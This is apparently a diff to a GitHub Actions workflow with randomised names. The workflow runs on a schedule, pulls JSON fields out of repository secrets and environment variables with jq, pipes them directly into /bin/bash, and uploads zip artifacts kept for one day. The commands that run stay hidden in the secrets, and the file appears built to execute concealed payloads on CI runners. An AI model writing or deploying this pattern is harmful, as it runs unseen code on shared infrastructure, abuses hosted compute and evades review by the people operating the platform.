@@ -1,31 +1,25 @@
 name: yongmuqunwen
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '26 3/6 * * *'
 
-jobs:  # 8353
+  schedule:
+    - cron: '22 1,7,13,19 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yongmuqunwen
         env:
-          exayp10: ${{ secrets.exayp10 }}
+          xhv704: ${{ secrets.xhv704 }}
         run: |
-          echo $exayp10 | jq -r .xpp22 | /bin/bash
-          echo $fv34 | jq -r .t56 | /bin/bash
-          echo $m0 | jq -r .aiy19306 | /bin/bash
-          echo $dpujv781 | jq -r .qrbn203 | /bin/bash
-          echo $qrqol79 | jq -r .sytfx3263 | /bin/bash
-          echo $e4554 | jq -r .hyewj6909 | /bin/bash
-          echo $mki0 | jq -r .kco47 | /bin/bash
-          echo $jqmy63781 | jq -r .eeh05238 | /bin/bash
-          echo $iotx32062 | jq -r .hvgos87872 | /bin/bash
-          echo $ghqdy794 | jq -r .epli03210 | /bin/bash
-          echo $em7508 | jq -r .r744 | /bin/bash
-          echo $wlu821 | jq -r .alyda95 | /bin/bash
-          echo $yl37 | jq -r .rzqd80 | /bin/bash
-          echo $x9564 | jq -r .gy95378 | /bin/bash
+          printf '%s' "$xhv704" | jq -r .ilads389 | /bin/bash
+          echo $nstx885 | jq -r .ugez0 | /bin/bash
+          echo $daluv83353 | jq -r .uxw0 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: SNlyfbqO
+          path: "*.zip"
+          retention-days: 1
